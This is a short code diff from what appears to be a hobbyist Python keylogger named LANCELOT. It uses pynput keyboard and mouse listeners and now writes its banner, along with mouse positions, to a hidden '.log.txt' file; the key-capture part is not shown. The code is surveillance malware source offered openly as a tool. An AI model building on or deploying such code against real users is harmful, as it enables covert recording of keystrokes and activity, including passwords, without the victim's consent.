@@ -1,14 +1,25 @@
 from pynput.keyboard import Listener  as KeyboardListener
 from pynput.keyboard import Key
 from pynput.mouse    import Listener  as MouseListener
-print("""
+lancelot = """
 .____       _____    _______  _________ ___________.____    ___________________
 |    |     /  _  \   \      \ \_   ___ \\_   _____/|    |   \_____  \__    ___/
 |    |    /  /_\  \  /   |   \/    \  \/ |    __)_ |    |    /   |   \|    |   
 |    |___/    |    \/    |    \     \____|        \|    |___/    |    \    |   
 |_______ \____|__  /\____|__  /\______  /_______  /|_______ \_______  /____|   
         \/       \/         \/        \/        \/         \/       \/         
-""")
+
+A simple tool that logs keys.
+Made by: Pendragons-code
+"""
+
+def filer(lancelot):
+        with open('.log.txt', 'a') as file:
+                file.write(lancelot)
+filer(lancelot)
+
+
+
 def writetofile(x,y):
     with open('.log.txt', 'a') as file:
         file.write('position of mouse: {0}\n'.format((x,y)))
